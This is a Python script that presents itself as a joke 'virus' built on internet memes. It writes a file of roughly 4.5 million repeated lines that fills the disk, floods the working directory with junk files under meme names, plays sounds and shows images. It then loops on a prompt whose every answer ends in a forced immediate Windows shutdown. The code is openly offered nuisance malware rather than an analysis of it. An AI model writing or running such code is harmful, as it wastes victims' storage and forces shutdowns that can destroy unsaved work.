from easygui import*
from pyautogui import*
import random
from pygame import mixer
from emoji import*
import os
from tkinter import*
from tkinter import messagebox
import keyboard

messagebox.showwarning("WARNING","WARNING: this virus will roast you 'till you go insane. Plus it's no joke")

filename="MyMessage.txt"

filenames=["hello","bruh","hello2","hello22","test","no","yes","nggyu","nglyd","nevergonnagiveyouupnevergonnaletyoudown","gfihgugh","iyhg","uurer","6756","157","hffry","nightmare","nightmRAE","nightmare.txt.py.cpp.h","NightName","Nightname","NightNare","nightmareeeeeeeeeeeeeeeeeeeeeeee","goofyaaahhhhhhhhh.exe","wutdahell","SIKEEEEEEEE","skibidirizzler","hello_hello","RickAstley.cpp.txt.exe","goofyahhhhh","goooooofyyyyy","datoilet","stickingoutyourgyattfortherizzleryoursoskibidiyoursofanumtaxgimmeohio","gyatttttt","σκ∫β∫∂∫ θω∫λεθ","αμωγ∪σ","skibidi θω∫λεθ","what_the_sigma","ermmmm_what_the_sigma"+emojize(":skull:"),emojize(":skull:")+emojize(":skull:")+emojize(":skull:")+emojize(":skull:")+emojize(":skull:")+emojize(":skull:")+emojize(":skull:")]

class Parent:
    def __init__(self,filename):
        self.filename=filename
    def write_file(self):
        with open (self.filename,'w') as file:
            file.write("Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wroldHello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold Hello word my name is Hello wrold ")


class Child(Parent):
    def __init__(self, filename):
        super().__init__(filename)
    def da_rest(self):
        with open(self.filename,'a') as file:
            choicelist=[1,2]
            for i in range(4555235):
                choice_=random.choice(choicelist)
                if choice_==1:
                    file.write("L + RATIO + DIDNT ASK\n")
                if choice_==2:
                    file.write("L + RATIO + DIDNT ASK\n".lower())

    def annoy_user(self):
        filename_=random.choice(filenames)
        for i in range(len(filenames)):
            try:
                with open(filename_,'w') as file:
                    file.write(" ")
                print(emojize(":skull::skull::skull::skull::skull::skull::skull::skull::skull::skull::skull::skull::skull::skull::skull::skull::skull::skull::skull::skull::skull::skull::skull::skull::skull::skull::skull::skull::skull::skull::skull::skull::skull::skull:"))
            except FileNotFoundError:
                with open("ahhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh",'w') as f:
                    f.write("ahhhhhhhhhhhhh ahhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh aHHHHHHHHHHHHHHHHHHH                   AHHHHHHHHHHHHHHHHHHHHH")
                with open("ahhhhhhhhhhhhhhhhhhhhhhh",'w') as f:
                    f.write("ahhhhhhhhhhhhh ahhhhhhhhhhhhhhhhHHHHHHHhhhhhhhhh aHHHHHHHHHHHHHHHHHHH                   AHHHHHHHHHHHHHHHHHHHHH")
                with open("ahHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHhhhhhhhhhhhhhhhhhh",'w') as f:
                        f.write("ahhhhhhhhhhhhh ahhhhh")
                with open("ahHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHhhh",'w') as f:
                    f.write("ahhhhhHHHHHHHhhhhhhhhh aHHHHHHHHHHHHHHHHHHH                   AHHHHHHHHHHHHHHHHHHHHH")         
    # def bruh(self):
    #     num_=0
    #     num_=10
    #     while num_  >= 0:
    #         messagebox.showerror("","bruh")
    #         mixer.music.load("bruh.mp3")
    #         mixer.music.play()
    #         sleep(0.1)
    #         num_ -= 1  
    #     print("done")

    mixer.init()
    mixer.music.load("meme_alarm.mp3")
    mixer.music.play()

parent=Parent(filename)
new_file="HAHHAHAHAHA"
child=Child(new_file)
parent.write_file()
child.da_rest()
from PIL import Image
image=Image.open("rick-roll.jpg")
image2=Image.open("meme.jpg")
image3=Image.open("jumpscare.jpg")
print("close the window")
image.show()
print("close the window")
image2.show()
print("close the window")
image3.show()

for i in range(10):
    msgbox("bruh",ok_button="...")
    mixer.music.load("bruh.mp3")
    mixer.music.play()

os.startfile('fbi-open-up.mp4')

while True:
    num=100
    while num > 0:
        child.annoy_user()
        num -= 1
    window=Tk()
    window.eval('tk::PlaceWindow %s center' %window.winfo_toplevel())
    window.withdraw()
    if messagebox.askyesno("","Do you accept your fate?")==True:
        os.system("shutdown /s /t 0")  
    else:
        msgbox("You have 2 minutes to do some stuff before your computer shut down.",msg="OK")
        sleep(120)
        os.system("shutdown /s /t 0")
            
    window.deiconify()
    window.destroy()
    window.quit()
